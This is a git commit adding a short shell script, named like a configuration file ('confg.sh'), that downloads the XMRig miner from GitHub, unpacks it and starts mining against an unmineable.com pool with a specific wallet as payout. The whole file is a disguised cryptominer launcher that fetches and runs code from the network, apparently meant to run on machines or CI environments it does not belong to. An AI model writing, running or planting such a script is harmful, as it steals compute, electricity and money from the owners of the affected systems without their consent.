33fb31178950bf6e92c8ae2ba26e0880c7e80894
Vinay Kumar Mogulluru <vinayeim@gmail.com>
2021-10-19 20:05:41 +0530

    Create confg.sh

---
+++ confg.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SHIB:0xc3ADB07132C1672F7DAc8BAAF81e12A47076dD42.eim#7v5a-do2f
